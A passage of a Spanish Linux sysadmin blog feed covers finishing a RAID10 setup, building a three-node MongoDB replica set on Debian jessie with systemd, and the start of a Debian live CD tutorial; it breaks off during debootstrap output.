Disco /dev/md0: &lt;span class="m"&gt;16&lt;/span&gt; GiB, &lt;span class="m"&gt;17163091968&lt;/span&gt; bytes, &lt;span class="m"&gt;33521664&lt;/span&gt; sectores
Unidades: sectores de &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de sector &lt;span class="o"&gt;(&lt;/span&gt;lógico/físico&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de E/S &lt;span class="o"&gt;(&lt;/span&gt;mínimo/óptimo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;524288&lt;/span&gt; bytes / &lt;span class="m"&gt;1048576&lt;/span&gt; bytes
Tipo de etiqueta de disco: gpt
Identificador del disco: E3FE7B0A-0F5D-4151-84E8-49670C33B65E

Device     Start      End  Sectors Size Type
/dev/md0p1  &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;33521630&lt;/span&gt; &lt;span class="m"&gt;33519583&lt;/span&gt;  16G Linux filesystem

root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La primera (y única partición) se llama &lt;em&gt;/dev/md0p1&lt;/em&gt; y es el dispositivo que vamos a formatear, para posteriormente montarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkfs.ext4 /dev/md0p1 
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se está creando El sistema de ficheros con &lt;span class="m"&gt;4189947&lt;/span&gt; 4k bloques y &lt;span class="m"&gt;1048576&lt;/span&gt; nodos-i

UUID del sistema de ficheros: 11e454ce-72c4-41f8-a7bc-4d4a78b873c0
Respaldo del superbloque guardado en los bloques: 
    &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;, &lt;span class="m"&gt;294912&lt;/span&gt;, &lt;span class="m"&gt;819200&lt;/span&gt;, &lt;span class="m"&gt;884736&lt;/span&gt;, &lt;span class="m"&gt;1605632&lt;/span&gt;, &lt;span class="m"&gt;2654208&lt;/span&gt;, 
    &lt;span class="m"&gt;4096000&lt;/span&gt;

Reservando las tablas de grupo: hecho                           
Escribiendo las tablas de nodos-i: hecho                           
Creando el fichero de transacciones &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32768&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;: hecho
Escribiendo superbloques y la información contable del sistema de ficheros:   hecho  

root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos la carpeta que va a servir de &lt;em&gt;mountpoint&lt;/em&gt; para esta nueva partición:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /data
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Añadimos la partición en el fichero &lt;em&gt;/etc/fstab&lt;/em&gt;, para que se monte automáticamente tras cada reinicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# grep md0p1 /etc/fstab 
/dev/md0p1 /data ext4 defaults &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente la montamos. Como esta información ya está en el fichero &lt;em&gt;/etc/fstab&lt;/em&gt; no es necesario especificar los detalles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /data
root@server:~# df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;2&lt;/span&gt;,0G   651M  &lt;span class="m"&gt;1&lt;/span&gt;,2G  &lt;span class="m"&gt;35&lt;/span&gt;% /
udev              10M      &lt;span class="m"&gt;0&lt;/span&gt;   10M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev
tmpfs             50M   &lt;span class="m"&gt;4&lt;/span&gt;,4M   46M   &lt;span class="m"&gt;9&lt;/span&gt;% /run
tmpfs            124M      &lt;span class="m"&gt;0&lt;/span&gt;  124M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev/shm
tmpfs            &lt;span class="m"&gt;5&lt;/span&gt;,0M      &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;5&lt;/span&gt;,0M   &lt;span class="m"&gt;0&lt;/span&gt;% /run/lock
tmpfs            124M      &lt;span class="m"&gt;0&lt;/span&gt;  124M   &lt;span class="m"&gt;0&lt;/span&gt;% /sys/fs/cgroup
/dev/md0p1        16G    44M   15G   &lt;span class="m"&gt;1&lt;/span&gt;% /data
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como detalle, al no tratarse de una partición raíz de sistema operativo, no hace falta reservar bloques de emergencia; se trata de un 5% de la capacidad que podemos liberar (5% de 16gb son 800mb que podemos usar).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tune2fs -m &lt;span class="m"&gt;0&lt;/span&gt; /dev/md0p1 
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;0&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
root@server:~# df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;2&lt;/span&gt;,0G   651M  &lt;span class="m"&gt;1&lt;/span&gt;,2G  &lt;span class="m"&gt;35&lt;/span&gt;% /
udev              10M      &lt;span class="m"&gt;0&lt;/span&gt;   10M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev
tmpfs             50M   &lt;span class="m"&gt;4&lt;/span&gt;,4M   46M   &lt;span class="m"&gt;9&lt;/span&gt;% /run
tmpfs            124M      &lt;span class="m"&gt;0&lt;/span&gt;  124M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev/shm
tmpfs            &lt;span class="m"&gt;5&lt;/span&gt;,0M      &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;5&lt;/span&gt;,0M   &lt;span class="m"&gt;0&lt;/span&gt;% /run/lock
tmpfs            124M      &lt;span class="m"&gt;0&lt;/span&gt;  124M   &lt;span class="m"&gt;0&lt;/span&gt;% /sys/fs/cgroup
/dev/md0p1        16G    44M   16G   &lt;span class="m"&gt;1&lt;/span&gt;% /data
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Verificación&lt;/h2&gt;
&lt;p&gt;Podemos ver la información de estado del array de discos con el mismo comando &lt;em&gt;mdadm&lt;/em&gt;, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mdadm --detail /dev/md0
/dev/md0:
        Version : &lt;span class="m"&gt;1&lt;/span&gt;.2
  Creation Time : Sat Dec &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;21&lt;/span&gt;:19:42 &lt;span class="m"&gt;2015&lt;/span&gt;
     Raid Level : raid10
     Array Size : &lt;span class="m"&gt;16760832&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;.98 GiB &lt;span class="m"&gt;17&lt;/span&gt;.16 GB&lt;span class="o"&gt;)&lt;/span&gt;
  Used Dev Size : &lt;span class="m"&gt;8380416&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.99 GiB &lt;span class="m"&gt;8&lt;/span&gt;.58 GB&lt;span class="o"&gt;)&lt;/span&gt;
   Raid Devices : &lt;span class="m"&gt;4&lt;/span&gt;
  Total Devices : &lt;span class="m"&gt;4&lt;/span&gt;
    Persistence : Superblock is persistent

    Update Time : Sat Dec &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;21&lt;/span&gt;:30:11 &lt;span class="m"&gt;2015&lt;/span&gt;
          State : clean 
 Active Devices : &lt;span class="m"&gt;4&lt;/span&gt;
Working Devices : &lt;span class="m"&gt;4&lt;/span&gt;
 Failed Devices : &lt;span class="m"&gt;0&lt;/span&gt;
  Spare Devices : &lt;span class="m"&gt;0&lt;/span&gt;

         Layout : &lt;span class="nv"&gt;near&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;
     Chunk Size : 512K

           Name : server:0  &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;local&lt;/span&gt; to host server&lt;span class="o"&gt;)&lt;/span&gt;
           UUID : 217558a7:bc1cb1d4:9530ecda:ea477a6b
         Events : &lt;span class="m"&gt;19&lt;/span&gt;

    Number   Major   Minor   RaidDevice State
       &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;8&lt;/span&gt;       &lt;span class="m"&gt;16&lt;/span&gt;        &lt;span class="m"&gt;0&lt;/span&gt;      active sync set-A   /dev/sdb
       &lt;span class="m"&gt;1&lt;/span&gt;       &lt;span class="m"&gt;8&lt;/span&gt;       &lt;span class="m"&gt;32&lt;/span&gt;        &lt;span class="m"&gt;1&lt;/span&gt;      active sync set-B   /dev/sdc
       &lt;span class="m"&gt;2&lt;/span&gt;       &lt;span class="m"&gt;8&lt;/span&gt;       &lt;span class="m"&gt;48&lt;/span&gt;        &lt;span class="m"&gt;2&lt;/span&gt;      active sync set-A   /dev/sdd
       &lt;span class="m"&gt;3&lt;/span&gt;       &lt;span class="m"&gt;8&lt;/span&gt;       &lt;span class="m"&gt;64&lt;/span&gt;        &lt;span class="m"&gt;3&lt;/span&gt;      active sync set-B   /dev/sde
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;RESUMEN&lt;/strong&gt;: Ahora tengo un disco doble de rápido, doble de capacidad y con doble copia de datos. Afortunadamente, los discos duros son baratos...&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="raid"></category></entry><entry><title>Construyendo una replica set en mongodb</title><link href="http://www.linuxsysadmin.ml/2015/12/construyendo-una-replica-set-en-mongodb.html" rel="alternate"></link><published>2015-12-08T12:30:00+01:00</published><updated>2015-12-08T12:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-08:/2015/12/construyendo-una-replica-set-en-mongodb.html</id><summary type="html">&lt;p&gt;Muchas veces nos interesa obtener alta disponibilidad en los servicios que gestionamos. No hay nada mas desagradable que una llamada a las tantas de la noche porque se ha caído un nodo de una base de datos y no damos servicio. Para eso &lt;em&gt;mongodb&lt;/em&gt; nos ofrece el mecanismo de replicación …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces nos interesa obtener alta disponibilidad en los servicios que gestionamos. No hay nada mas desagradable que una llamada a las tantas de la noche porque se ha caído un nodo de una base de datos y no damos servicio. Para eso &lt;em&gt;mongodb&lt;/em&gt; nos ofrece el mecanismo de replicación.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a montar una &lt;em&gt;replica set&lt;/em&gt;, de forma que si se cayera un nodo de la base de datos, otro asumiría su rol, de forma que se seguiría dando servicio.&lt;/p&gt;
&lt;p&gt;Nuestra &lt;em&gt;replica set&lt;/em&gt; va a tener 3 nodos, que vamos a alojar en 3 máquinas distintas, de forma que la caída de una máquina afecte solamente a 1 proceso de &lt;em&gt;mongodb&lt;/em&gt;. La caonfiguración de 3 nodos nos da una tolerancia a fallos de 1 máquina; mientras queden 2, el clúster va a seguir operativo.&lt;/p&gt;
&lt;h2&gt;Descripción del entorno&lt;/h2&gt;
&lt;p&gt;Disponemos de 3 máquinas que vamos a llamar &lt;strong&gt;mongo1&lt;/strong&gt;, &lt;strong&gt;mongo2&lt;/strong&gt; y &lt;strong&gt;mongo3&lt;/strong&gt;. Cada una funciona con un sistema operativo &lt;em&gt;Debian jessie&lt;/em&gt; con &lt;em&gt;systemd&lt;/em&gt; y cuenta 1 gb de disco y con 256 mb de memoria; para esta demostración no se necesita mas.&lt;/p&gt;
&lt;p&gt;Como pequeño detalle, las máquinas se van referir entre ellas por nombre, pero como no me interesa poner una solución completa de &lt;em&gt;DNS&lt;/em&gt;, he puesto en el fichero &lt;em&gt;/etc/hosts&lt;/em&gt; de todas las máquinas las equivalencias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# grep mongo /etc/hosts
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2    mongo1
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3    mongo2
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4    mongo3
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Consideraciones de seguridad&lt;/h2&gt;
&lt;p&gt;Estas máquinas se comunican entre sí por el puerto TCP en el que corran sus procesos; para seguir con el puerto "titular" vamos a ponerlos en el puerto 27017. Es importante que las 3 máquinas puedan acceder al puerto de las otras 2. Adicionalmente, la máquina que vaya a usar este clúster también debe pode acceder al puerto 27017 de las 3 máquinas.&lt;/p&gt;
&lt;h2&gt;Preparación de las máquinas individuales&lt;/h2&gt;
&lt;p&gt;Queremos una versión de &lt;em&gt;mongodb&lt;/em&gt; un poco reciente, así que no vamos a usar los paquetes oficiales de la distribución, y la empresa de &lt;em&gt;mongodb&lt;/em&gt; no ofrece paquete para &lt;em&gt;Debian jessie&lt;/em&gt;. Por ello vamos a montar un esqueleto de ficheros como se describe en &lt;a href="http://www.linuxsysadmin.ml/2015/11/escribiendo-units-en-systemd.html"&gt;un artículo anterior&lt;/a&gt;. Vamos a describir el proceso en la máquina &lt;strong&gt;mongo1&lt;/strong&gt;, para replicarlo a posteriori en las otras 2.&lt;/p&gt;
&lt;p&gt;Creamos la estructura de carpetas que van a contener todo lo relativo a &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# mkdir -p /opt/mongodb/&lt;span class="o"&gt;{&lt;/span&gt;bin,conf,data/replica,logs&lt;span class="o"&gt;}&lt;/span&gt;
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Copiamos el binario &lt;strong&gt;mongod&lt;/strong&gt; que encontraremos en el fichero &lt;em&gt;.tar.gz&lt;/em&gt; de la página de descargas de la página web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cp mongod /opt/mongodb/bin/
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos un fichero de configuración con el que vamos a levantar el proceso en esta máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cat /opt/mongodb/conf/replica.conf
systemLog:
    path: /opt/mongodb/logs/replica.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27017&lt;/span&gt;
    bindIp: &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0

storage:
    dbPath: /opt/mongodb/data/replica
    smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;

replication:
    replSetName: replica
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por razones de seguridad vamos a lanzar el servicio con un usuario propio de sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# useradd -s /usr/sbin/nologin -r -M mongo -d /opt/mongodb/
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para ahorrarnos problemas de permisos, lo hacemos propietario de todo lo referente al servicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# chown -R mongo:mongo /opt/mongodb/
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crearle una &lt;strong&gt;unit&lt;/strong&gt; para que el sistema se encargue de levantar automáticamente el servicio en caso de reinicio de la máquina:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cat /etc/systemd/system/mongo.service
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/replica/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/replica.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente activamos la &lt;strong&gt;unit&lt;/strong&gt; e iniciamos el servicio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo
Created symlink from /etc/systemd/system/multi-user.target.wants/mongo.service to /etc/systemd/system/mongo.service.
root@mongo1:~# systemctl start mongo
root@mongo1:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora toca repetir el proceso en las otras 2 máquinas, exactamente igual.&lt;/p&gt;
&lt;h2&gt;Configuración del clúster&lt;/h2&gt;
&lt;p&gt;Accedemos a una de las máquinas del futuro clúster desde cualquier máquina que pueda hacerlo y que disponga del binario &lt;strong&gt;mongo&lt;/strong&gt; (el mongo shell), que también viene en el archivo &lt;em&gt;.tar.gz&lt;/em&gt; descargado de la página oficial; este shell no es necesario para la aplicación que use el clúster ya que el &lt;strong&gt;driver&lt;/strong&gt; de cada lenguaje suple sus funciones, pero es muy útil tenerlo a mano para tareas de administración y consultas varias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ./mongo --host &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.0.7
connecting to: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:27017/test
Welcome to the MongoDB shell.
For interactive help, &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;.
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay dos formas de crear la configuración del clúster: pasando el documento de configuración en el método &lt;em&gt;initiate&lt;/em&gt; o añadir los nodos a posteriori con el método &lt;em&gt;add&lt;/em&gt;. Voy a usar este método por ser mas fácil.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration explicitly specified -- making one&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
replica:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mongo2:27017&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
replica:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mongo3:27017&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
replica:PRIMARY&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a lanzar el método &lt;em&gt;status&lt;/em&gt; hasta que todos los nodos sean primarios o secundarios, momento en el que la &lt;em&gt;replica&lt;/em&gt; va a quedar correctamente montada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;replica:PRIMARY&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;set&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;replica&amp;quot;&lt;/span&gt;,
...
    &lt;span class="s2"&gt;&amp;quot;members&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
...
            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;PRIMARY&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;self&amp;quot;&lt;/span&gt; : &lt;span class="nb"&gt;true&lt;/span&gt;
...
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="o"&gt;{&lt;/span&gt;
...
            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo2:27017&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;syncingTo&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
...
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="o"&gt;{&lt;/span&gt;
...
            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo3:27017&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;syncingTo&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
...
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
replica:PRIMARY&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esta salida del método &lt;em&gt;status&lt;/em&gt; ya lo tenemos todo funcionando correctamente.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="mongodb"></category><category term="replica set"></category><category term="systemd"></category></entry><entry><title>Creación de un livecd con Debian</title><link href="http://www.linuxsysadmin.ml/2015/12/creacion-de-un-livecd-con-debian.html" rel="alternate"></link><published>2015-12-02T12:30:00+01:00</published><updated>2015-12-02T12:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-02:/2015/12/creacion-de-un-livecd-con-debian.html</id><summary type="html">&lt;p&gt;Tras ver como las actualizaciones de mis máquinas virtuales &lt;em&gt;VirtualBox&lt;/em&gt; expandían mis discos &lt;em&gt;.vdi&lt;/em&gt; sin control, quise pasar la herramienta &lt;em&gt;zerofree&lt;/em&gt; y un compactado con la herramienta oficial &lt;em&gt;VBoxManage&lt;/em&gt;. No quería instalar &lt;em&gt;zerofree&lt;/em&gt; de forma permanente y no pude encontrar un &lt;em&gt;livecd&lt;/em&gt; que lo tuviera, así que decidí crear uno …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tras ver como las actualizaciones de mis máquinas virtuales &lt;em&gt;VirtualBox&lt;/em&gt; expandían mis discos &lt;em&gt;.vdi&lt;/em&gt; sin control, quise pasar la herramienta &lt;em&gt;zerofree&lt;/em&gt; y un compactado con la herramienta oficial &lt;em&gt;VBoxManage&lt;/em&gt;. No quería instalar &lt;em&gt;zerofree&lt;/em&gt; de forma permanente y no pude encontrar un &lt;em&gt;livecd&lt;/em&gt; que lo tuviera, así que decidí crear uno.&lt;/p&gt;
&lt;p&gt;Para conseguirlo, se va a usar un sistema de ficheros creado con &lt;em&gt;debootstrap&lt;/em&gt; y compactado mediante &lt;em&gt;SquashFS&lt;/em&gt;; este sistema de ficheros se va a empaquetar en un &lt;em&gt;.iso&lt;/em&gt; junto con un &lt;em&gt;kernel&lt;/em&gt;, un &lt;em&gt;initrd&lt;/em&gt; y el bootloader &lt;em&gt;isolinux&lt;/em&gt;. La herramienta que hace eso es &lt;em&gt;genisoimage&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Este tutorial se ejecutó en una distribución &lt;em&gt;Debian&lt;/em&gt;, pero no hay ningún problema en hacerlo en una &lt;em&gt;Ubuntu&lt;/em&gt; u otra distribución, siempre que sepamos como crear la imagen base para empaquetar.&lt;/p&gt;
&lt;h2&gt;Preparación del entorno&lt;/h2&gt;
&lt;p&gt;Todo el proceso va a ser ejecutado con el usuario &lt;em&gt;root&lt;/em&gt; por comodidad.&lt;/p&gt;
&lt;p&gt;Empezaremos por instalar todas las tecnologías que hemos mencionado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# apt-get install debootstrap isolinux squashfs-tools genisoimage
...
root@desktop:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos una carpeta de trabajo para contener todos los ficheros temporales y el producto final, por limpieza:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# mkdir live_boot
root@desktop:~# &lt;span class="nb"&gt;cd&lt;/span&gt; live_boot
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todos los comandos que se detallan a continuación se hacen desde dentro de esta carpeta.&lt;/p&gt;
&lt;h2&gt;Preparación del sistema de ficheros, el kernel y el initrd&lt;/h2&gt;
&lt;p&gt;El sistema de ficheros se hace a partir de una jaula estándar de una distribución normal. En este paso, las distribuciones que usan &lt;em&gt;debootstrap&lt;/em&gt; nos facilitan mucho las cosas (aunque esta es la operación mas larga de este tutorial):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase jessie chroot
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
